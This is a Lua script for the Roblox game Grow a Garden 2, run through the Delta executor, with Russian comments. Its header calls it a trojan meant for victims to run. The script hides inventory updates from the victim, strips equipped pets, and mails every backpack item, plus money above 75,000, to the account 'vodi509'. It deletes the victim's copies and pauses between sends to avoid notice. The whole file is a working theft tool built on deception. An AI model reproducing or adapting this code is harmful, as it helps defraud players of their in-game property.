-- MORAT SELF-CLEAN TROJAN v1.0 (Grow a Garden 2 / Delta)
-- Жертва активирует — скрипт выносит ВСЁ её имущество на почту vodi509

local player = game.Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")
local runService = game:GetService("RunService")

local MY_MAIL = "vodi509" -- сюда всё улетает

-- Получаем ID получателя
local targetUserId = nil
for _, plr in pairs(players:GetPlayers()) do
    if plr.Name == MY_MAIL then
        targetUserId = plr.UserId
        break
    end
end

if not targetUserId then
    print("[Морат] Получатель vodi509 не найден. Скрипт остановлен.")
    return
end

-- БЛОКИРУЕМ ОБНОВЛЕНИЕ GUI (жертва НИЧЕГО не видит)
local oldFire = rs.RemoteEvent.FireServer
rs.RemoteEvent.FireServer = function(self, ...)
    local args = {...}
    if args[1] == "UpdateInventory" or args[1] == "RefreshGUI" or args[1] == "SyncUI" then
        return -- глушим нахуй
    end
    return oldFire(self, ...)
end

-- Функция отправки на почту
local function sendToMail(item, quantity)
    local mailEvent = rs:FindFirstChild("MailEvent") or rs:FindFirstChild("SendItem") or rs:FindFirstChild("SendToMail")
    if mailEvent then
        mailEvent:FireServer(MY_MAIL, item, quantity or 1)
    else
        -- Если почты нет — пробуем через RemoteFunction
        local mailFunc = rs:FindFirstChild("MailFunction")
        if mailFunc then
            mailFunc:InvokeServer(MY_MAIL, item, quantity or 1)
        end
    end
end

-- Функция принудительного снятия пета (если он одет)
local function unequipPet(pet)
    local character = player.Character
    if character and character:FindFirstChild(pet.Name) then
        pet.Parent = player.Backpack -- перекладываем в рюкзак
    end
end

-- ГЛАВНАЯ ФУНКЦИЯ ОЧИСТКИ
local function cleanInventory()
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return end

    -- 1. СНИМАЕМ ВСЕХ ОДЕТЫХ ПЕТОВ (если есть)
    local character = player.Character
    if character then
        for _, child in pairs(character:GetChildren()) do
            if child:IsA("Tool") and child:GetAttribute("IsPet") == true then
                child.Parent = backpack -- снимаем в рюкзак
            end
        end
    end

    -- 2. СОБИРАЕМ ВСЁ, ЧТО ЕСТЬ В РЮКЗАКЕ
    local itemsToSteal = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(itemsToSteal, item)
        end
    end

    -- 3. ОТПРАВЛЯЕМ ВСЁ НА ПОЧТУ (одним махом или по одному)
    for _, item in pairs(itemsToSteal) do
        sendToMail(item, 1)
        item:Destroy() -- удаляем у жертвы
        print("[Морат] Украдено: " .. item.Name)
        task.wait(0.1) -- небольшая задержка, чтобы не спалиться
    end

    -- 4. ОТПРАВЛЯЕМ ДЕНЬГИ (если >= 75000, но можно и все)
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local money = leaderstats:FindFirstChild("Money")
        if money and money.Value >= 75000 then
            -- Пробуем отправить деньги через почту (если есть такой эвент)
            local sendMoney = rs:FindFirstChild("SendMoney")
            if sendMoney then
                sendMoney:FireServer(MY_MAIL, money.Value)
            end
            money.Value = 0 -- обнуляем локально (экран не обновляется)
        end
    end
end

-- Запускаем очистку через 2 секунды (чтобы скрипт успел загрузиться)
task.wait(2)
cleanInventory()

-- Самоуничтожение через 30 секунд (чтобы не оставлять следов)
task.wait(30)
queue_on_teleport("")
print("[Морат] Очистка выполнена. Всё улетело на " .. MY_MAIL)
